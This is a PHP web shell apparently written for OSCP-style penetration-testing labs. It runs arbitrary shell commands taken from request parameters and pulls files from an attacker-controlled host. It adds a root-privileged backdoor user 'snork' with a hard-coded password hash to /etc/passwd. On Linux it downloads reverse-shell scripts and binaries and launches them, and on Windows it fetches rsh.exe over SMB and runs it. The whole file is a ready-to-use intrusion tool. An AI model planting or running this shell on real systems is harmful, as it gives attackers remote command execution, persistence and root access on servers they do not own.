<?php
$lhost = '127.0.0.1';
$lpath = '/dev/shm';
$wpath= '\users\public\trash';
$detail = $_SERVER['HTTP_USER_AGENT'];

// Switch architecture if needed
if(2147483647 == PHP_INT_MAX) {
    $architecture = 'x86';
}
else {
    $architecture = 'x64';
}

if (isset($_REQUEST['fupload']))
{
    file_put_contents($_REQUEST['fupload'], file_get_contents($lhost . $_REQUEST['fupload']));
};

if (isset($_REQUEST['fexec']))
{
    echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
};

if (isset($_REQUEST['passwd']))
{
    shell_exec("echo 'snork:$1$xfqD9FuY$JU9BUGyF9.5.SrPG27.TP/:0:0::/root:/bin/bash' >> /etc/passwd");
};

if (isset($_REQUEST['gtools']))
{
    if( PHP_OS == 'Linux' )
    {
        shell_exec("wget http://".$lhost."/rsh/oscp/rsh443.php -O rsh.php");
        shell_exec("wget http://".$lhost."/rsh/oscp/rsh443.py -O ".$lpath."/rsh.py");
        shell_exec("wget http://".$lhost."/rsh/oscp/rsh443.sh -O ".$lpath."/rsh.sh");
        shell_exec("wget http://".$lhost."/rsh/oscp/rsh443-".$architecture.".elf -O ".$lpath."/rsh-x64.elf");
        shell_exec("wget http://".$lhost."/Linux/hts-".$architecture." -O ".$lpath."/hts");i
        shell_exec("chmod 755 ".$lpath."/hts*");
        shell_exec("chmod 755 ".$lpath."/rsh*");
        shell_exec("wget http://".$lhost."/Linux/scn.tgz -O ".$lpath."/scn.tgz");
        shell_exec($lpath."/rsh.sh &");
    }
    else if( strstr( PHP_OS, 'Windows' ) )
    {
        shell_exec("mkdir ".$wpath);
        shell_exec("expand \\" . $lhost . "\files\rsh.exe ".$wpath."\rsh.exe");
        shell_exec("expand \\" . $lhost . "\files\toybox\toybox-".$architecture.".zip ".$wpath."\toybox.zip");
        shell_exec("powershell -c 'expand-archive -path c:\users\public\trash\toybox.zip -destinationpath ".$wpath."'");
        shell_exec($wpath."\rsh.exe");
    }
    else
    {
        echo "You haven't told me how to get tools for this yet.  Update the script!";
    };
    echo "<pre>" . "ok" . "</pre>";
};

echo  "Operating System:  ".PHP_OS."<br>Arch:  ".$architecture."<br>";
echo  "fexec, fupload, gtools<br>";
?>
